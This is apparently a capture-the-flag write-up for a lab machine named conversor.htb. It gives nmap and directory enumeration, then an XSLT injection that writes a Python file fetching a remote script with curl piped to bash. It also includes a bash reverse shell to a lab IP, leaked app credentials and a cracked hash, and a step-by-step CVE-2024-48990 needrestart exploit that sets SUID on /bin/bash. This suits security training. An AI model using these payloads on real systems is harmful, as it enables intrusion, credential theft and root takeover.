---
tags:
  - xslt
  - linux
  - CVE
---



We will start with nmap:
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ9JqBn+xSQHg4I+jiEo+FiiRUhIRrVFyvZWz1pynUb/txOEximgV3lqjMSYxeV/9hieOFZewt/ACQbPhbR/oaE=
|   256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIR1sFcTPihpLp0OemLScFRf8nSrybmPGzOs83oKikw+
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web enumeration
root page
```
[14:25:15] Starting:
[14:25:22] 200 -    3KB - /about
[14:25:41] 301 -  319B  - /javascript  ->  http://conversor.htb/javascript/
[14:25:41] 404 -  275B  - /javascript/tiny_mce
[14:25:41] 404 -  275B  - /javascript/editors/fckeditor
[14:25:43] 200 -  722B  - /login
[14:25:52] 200 -  726B  - /register
[14:25:54] 403 -  278B  - /server-status
[14:25:54] 403 -  278B  - /server-status/

login                   [Status: 200, Size: 722, Words: 30, Lines: 22, Duration: 79ms]
register                [Status: 200, Size: 726, Words: 30, Lines: 21, Duration: 72ms]
                        [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 290ms]
about                   [Status: 200, Size: 2842, Words: 577, Lines: 81, Duration: 311ms]
javascript              [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 71ms]
logout                  [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 65ms]
convert                 [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 62ms]
```

found the source code in about.

Found a wep application that takes `xml` and xslt `and` do operations on `xml` based on what is in `xslt`, and `xslt` can execute system commands so we used this xslt file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:shell="http://exslt.org/common"
extension-element-prefixes="shell"
version="1.0">
<xsl:template match="/">
<shell:document href="/var/www/conversor.htb/scripts/revshell.py" method="text">
import os
os.system("curl http://10.10.14.243:80/shell.sh | bash")
</shell:document>
</xsl:template>
</xsl:stylesheet>

___shell.sh___ file content
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.243/4444 0>&1
```
the xml file is reguler file
```xml
<root>
<data>test</data>
</root>
```

Got reverse shell.

Between application files found some creds
```
app.secret_key = 'C0nv3rs0rIsthek3y29'
INSERT INTO users VALUES(1,'fismathack','5b5c3ac3a1c897c94caad48e6c71fdec');  --> Keepmesafeandwarm
```
got user.txt

---

```
systemd+     743  0.0  0.3  26860 14420 ?        Ss   08:35   0:00 /lib/systemd/systemd-resolved
systemd+     744  0.0  0.1  89364  6736 ?        Ssl  08:35   0:00 /lib/systemd/systemd-timesyncd
root         745  0.0  0.0  85616  3104 ?        S<sl 08:35   0:01 /sbin/auditd
_laurel      747  0.0  0.1   9988  6056 ?        S<   08:35   0:01 /usr/local/sbin/laurel --config /etc/laurel/config.toml
root         784  0.0  0.2  51152 11688 ?        Ss   08:35   0:00 /usr/bin/VGAuthService
root         787  0.1  0.2 242340  9956 ?        Ssl  08:35   0:08 /usr/bin/vmtoolsd
root         800  0.0  0.1 101244  5968 ?        Ssl  08:35   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0
root         830  0.0  0.0  82836  3996 ?        Ssl  08:35   0:00 /usr/sbin/irqbalance --foreground
root         831  0.0  0.4  32732 19636 ?        Ss   08:35   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         832  0.0  0.1 234508  6600 ?        Ssl  08:35   0:00 /usr/libexec/polkitd --no-debug
syslog       833  0.0  0.1 222404  5872 ?        Ssl  08:35   0:00 /usr/sbin/rsyslogd -n -iNONE
root         834  0.0  0.1  15332  7564 ?        Ss   08:35   0:00 /lib/systemd/systemd-logind
root         835  0.0  0.3 392612 12716 ?        Ssl  08:35   0:00 /usr/libexec/udisks2/udisksd
root         857  0.0  0.2 244240 11896 ?        Ssl  08:35   0:00 /usr/sbin/ModemManager
root         982  0.0  0.0   6896  2824 ?        Ss   08:35   0:00 /usr/sbin/cron -f -P
root        1011  0.0  0.2  15436  8808 ?        Ss   08:35   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        1012  0.0  0.0   6176  1100 tty1     Ss+  08:35   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        1015  0.0  0.1  14076  5312 ?        Ss   08:35   0:00 /usr/sbin/apache2 -k start
www-data    1017  0.0  1.0 1249616 41552 ?       Sl   08:35   0:00 /usr/sbin/apache2 -k start
www-data    1018  0.0  1.0 1249372 41716 ?       Sl   08:35   0:00 /usr/sbin/apache2 -k start
root        1419  0.0  0.7 387696 28504 ?        Ssl  08:48   0:01 /usr/libexec/fwupd/fwupd
root        1429  0.0  0.2 239660  8108 ?        Ssl  08:48   0:00 /usr/libexec/upowerd
fismath+    3324  0.0  0.2  17096  9404 ?        Ss   10:02   0:00 /lib/systemd/systemd --user
fismath+    3428  0.0  0.2  17312  8200 ?        S    10:02   0:00 sshd: fismathack@pts/1
fismath+    3431  0.0  0.1   8812  5628 pts/1    Ss   10:02   0:00 -bash
```

found we can run `sudo /usr/sbin/needrestart`, and its vulnerable to `CVE-2024-48990`
exploit
```sh
# Create a directory for the exploit
mkdir -p ~/exploit/importlib
# create a file ~/exploit/importlib/__init__.py
import os 
os.system("chmod u+s /bin/bash")
# create another file ~/exploit/dummy.py:
while True: 
	pass
# Launch the dummy Python process with a malicious PYTHONPATH pointing to your exploit directory
PYTHONPATH=~/exploit python3 ~/exploit/dummy.py &
# Verify the process is running and has the correct PYTHONPATH:
ps aux | grep dummy.py
cat /proc/1234/environ | tr '\0' '\n' | grep PYTHONPATH # change 1234 based on ps output, process id using ps
# run 
sudo /usr/sbin/needrestart -r l
# 
ls -l /bin/bash
# It should show -rwsr-xr-x
/bin/bash -p
```